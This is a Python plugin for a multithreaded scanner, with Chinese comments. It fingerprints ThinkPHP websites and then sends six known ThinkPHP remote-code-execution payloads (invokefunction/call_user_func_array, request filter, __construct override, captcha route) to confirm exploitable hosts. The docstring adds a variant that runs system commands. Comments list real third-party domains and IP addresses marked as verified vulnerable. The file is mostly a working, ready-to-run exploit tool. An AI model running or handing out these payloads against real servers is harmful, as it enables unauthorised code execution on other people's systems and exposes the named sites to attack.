import requests
import threading
import hashlib
from termcolor import cprint
from tqdm import *
from colorama import Fore

# 全都用tqdm.write(url)打印     能够打印在进度条上方，并将进度条下移一行。
# 存在漏洞可能得需要红色，使用   tqdm.write(Fore.RED + url)   打印则有颜色
# 打印一些错误需要灰色 使用   tqdm.write(Fore.WHITE + url)
# 打印漏洞结果 使用   tqdm.write(Fore.BLACK + url)


class Detect(threading.Thread):
    name = 'thinkphp'

    def __init__(self, alive_Web_queue, pbar, vul_list, requests_proxies):
        threading.Thread.__init__(self)
        self.alive_Web_queue = alive_Web_queue  # 存活web的队列
        self.pbar = pbar  # 进度条
        self.vul_list = vul_list  # 存储漏洞的名字和url
        self.proxies = requests_proxies  # 代理
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}

    def run(self):
        while not self.alive_Web_queue.empty():
            alive_web = self.alive_Web_queue.get()
            self.pbar.set_postfix(url=alive_web, vul=self.name)  # 进度条的显示
            self.run_detect(alive_web.rstrip('/'))
            self.pbar.update(1)  # 每完成一个任务，进度条也加+1
            self.alive_Web_queue.task_done()

    # 只需要修改下面的代码就行
    def run_detect(self, url):          # logo的指纹，X-Powered-By: ThinkPHP，源码thinkphp, favicon
        # 测试url
        # /1111111111111111111111111111111-index.html       # 报错页面有ThinkPHP                             # https://xcx.luyimeishu.com/
        # /?c=4e5e5d7364f443e28fbf0d3ae744a59a              # a33d202b17b9b1a50e5ac54af6eff74e              # http://43.226.47.243/
        # /favicon.ico                                      # f49c4a4bde1eec6c0b80c2277c76e3db              # http://45.77.170.153:81/
        # X-Powered-By: ThinkPHP                            # 响应头里有ThinkPHP                             # http://117.40.227.152:8000/


        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0'}
        error_url = url + '/1111111111111111111111111111111-index.html'     # 报错页面有ThinkPHP
        c_url = url + '/?c=4e5e5d7364f443e28fbf0d3ae744a59a'                # tp框架的指纹，访问该路径，会出现tp5的logo
        favicon_url = url + '/favicon.ico'                                  # tp框架的图标
        x_powered_by_url = url                                              # 通过响应头查看

        type_url = ''       # 保存识别的类型
        # 报错页面有ThinkPHP
        try:
            res = requests.get(url=error_url, headers=headers, proxies=self.proxies, timeout=10)
            if 'ThinkPHP' in res.text:
                tqdm.write(Fore.RED + '[thinkphp] {}'.format(error_url))
                type_url = error_url
                # if self.attack(url):
                #     self.vul_list.append(['thinkphp', error_url, 'YES'])
                # else:
                #     self.vul_list.append(['thinkphp', error_url, 'Maybe'])
            else:
                pass
                # print('[-] {}'.format(error_url))
        except Exception as e:
            pass
            # print('[error] {}: {}'.format(error_url, e.args))

        # tp框架的指纹，访问该路径，会出现tp5的logo
        try:
            res = requests.get(url=c_url, headers=headers, proxies=self.proxies, timeout=10)
            src = res.content
            m1 = hashlib.md5()
            m1.update(src)
            the_md5 = m1.hexdigest()
            if the_md5 == 'a33d202b17b9b1a50e5ac54af6eff74e':
                tqdm.write(Fore.RED + '[thinkphp] {}:{}'.format(c_url, the_md5))
                type_url = c_url
                # if self.attack(url):
                #     self.vul_list.append(['thinkphp', c_url, 'YES'])
                # else:
                #     self.vul_list.append(['thinkphp', c_url, 'Maybe'])
            else:
                # print('[-] {}'.format(c_url))
                pass
        except Exception as e:
            # print('[error] {}: {}'.format(c_url, e.args))
            pass

        # tp框架的图标
        try:
            res = requests.get(url=favicon_url, headers=headers, proxies=self.proxies, timeout=10)
            src = res.content
            m1 = hashlib.md5()
            m1.update(src)
            the_md5 = m1.hexdigest()
            if the_md5 == 'f49c4a4bde1eec6c0b80c2277c76e3db':
                tqdm.write(Fore.RED + '[thinkphp] {}'.format(favicon_url))
                type_url = favicon_url
                # if self.attack(url):
                #     self.vul_list.append(['thinkphp', favicon_url, 'YES'])
                # else:
                #     self.vul_list.append(['thinkphp', favicon_url, 'Maybe'])
            else:
                pass
                # print('[-] {}'.format(favicon_url))
        except Exception as e:
            pass
            # print('[error] {}: {}'.format(favicon_url, e.args))

        # 通过响应头查看
        try:
            res = requests.get(url=x_powered_by_url, headers=headers, proxies=self.proxies, timeout=10)
            res_headers = res.headers
            if 'X-Powered-By' in res_headers.keys() and 'ThinkPHP' in res_headers['X-Powered-By']:
                tqdm.write(Fore.RED + '[thinkphp] {}'.format(x_powered_by_url))
                type_url = x_powered_by_url
                # if self.attack(url):
                #     self.vul_list.append(['thinkphp', x_powered_by_url, 'YES'])
                # else:
                #     self.vul_list.append(['thinkphp', x_powered_by_url, 'Maybe'])
            else:
                pass
                # print('[-] {}    X-Powered-By'.format(x_powered_by_url))
        except Exception as e:
            pass

        try:
            if type_url:
                isVul, tpPayload = self.attack(url)
                if isVul:
                    self.vul_list.append(['thinkphp', url, r'YES {}'.format(tpPayload)])
                else:
                    self.vul_list.append(['thinkphp', type_url, 'Maybe'])
            return False
        except Exception as e:
            return False
            # print('[error] {}    X-Powered-By : {}'.format(x_powered_by_url, e.args))

    def attack(self, url):
        '''
        payload1:/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=base64_encode&vars[1][]=123456

        payload2:/?s=index/think\request/input?data=123456&filter=base64_encode

        payload3:/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=base64_encode&vars[1][]=123456


        payload4:POST /public/?s=index/index
            data:_method=__construct&method=GET&filter[]=print_r&get[]=MTIzNDU2     只有用print_r才回显，用base64_encode不回显

        第五个有点特殊
        payload5:POST /public/?s=captcha/{cmd}
            data:_method=__construct&filter[]=system&method=GET&s=1
        '''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0'}
        #     r'/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=base64_encode&vars[1][]=123456'

        tpPayload_1 = ['GET', r'/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=base64_encode&vars[1][]=123456'] # ok https://www.778085.com/
        tpPayload_2 = ['GET', r'/index.php?s=index/think\request/input?data=123456&filter=base64_encode']       # ok http://45.32.46.42:8090/
        tpPayload_3 = ['GET', r'/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=base64_encode&vars[1][]=123456']   # ok http://45.32.46.42:8090/
        tpPayload_4 = ['POST', r'/public/?s=index/index', r'_method=__construct&method=GET&filter[]=print_r&get[]=MTIzNDU2']        # ok    https://www.shijiyouping.com/
        tpPayload_5 = ['POST', r'/index.php?s=/Index/\think\app/invokefunction', r'function=call_user_func_array&vars[0]=base64_encode&vars[1][]=123456']        # ok    http://api.geturl.win/
        tpPayload_6 = ['POST', r'/public/?s=captcha/MTIzNDU2', r'_method=__construct&filter[]=print_r&method=GET&s=1']      # ok http://api.geturl.win/

        tpPayloads = []
        for name, value in locals().items():
            if 'tpPayload_' in name:
                tpPayloads.append(value)

        for tpPayload in tpPayloads:
            if tpPayload[0] == 'GET':
                reqMethod, tpPayload_url = tpPayload
                try:
                    # print(url + tpPayload_url)
                    res = requests.get(url=url+tpPayload_url, headers=headers, proxies=self.proxies, timeout=20)
                    if 'MTIzNDU2' in res.text:
                        tqdm.write(Fore.RED + '[+] {} {}'.format(url, tpPayload))
                        return [True, tpPayload]
                    else:
                        pass
                        # print('[-] {} {}'.format(url, tpPayload))
                        # return False
                except Exception as e:
                    # print('[-] {} {} error:{}'.format(url, tpPayload, e.args))
                    return False
            else:
                reqMethod, tpPayload_url, tpPayload_data = tpPayload
                data = {}
                for _ in tpPayload_data.split('&'):
                    key, value = _.split('=')
                    data[key] = value
                try:
                    # print(url+tpPayload_url)
                    # print(data)
                    res = requests.post(url=url+tpPayload_url, data=data, headers=headers, proxies=self.proxies, timeout=20)
                    # print(res.status_code)
                    if 'MTIzNDU2' in res.text:
                        tqdm.write(Fore.RED + '[+] {} {}'.format(url, tpPayload))
                        return [True, tpPayload]
                    else:
                        pass
                        # print('[-] {} {}'.format(url, tpPayload))
                        # return False
                except Exception as e:
                    # print('[-] {} {} error:{}'.format(url, tpPayload, e.args))
                    return False

        return [False, '']


if __name__ == '__main__':
    from queue import Queue

    alive_web = ['']
    vul_list = []
    # proxy = r''
    # requests_proxies = {"http": "socks5://{}".format(proxy), "https": "socks5://{}".format(proxy)}
    requests_proxies = None
    alive_Web_queue = Queue(-1)  # 将存活的web存入队列里
    for _ in alive_web:
        alive_Web_queue.put(_)

    threads = []
    thread_num = 5  # 漏洞检测的线程数目

    pbar = tqdm(total=alive_Web_queue.qsize(), desc="检测漏洞", ncols=150)  # total是总数

    for num in range(1, thread_num + 1):
        t = Detect(alive_Web_queue, pbar, vul_list, requests_proxies)  # 实例化漏洞类，传递参数：存活web的队列，  存储漏洞的列表
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    tqdm.write(Fore.BLACK + '-'*50 + '结果' + '-'*50)
    for vul in vul_list:
        tqdm.write(Fore.BLACK + str(vul))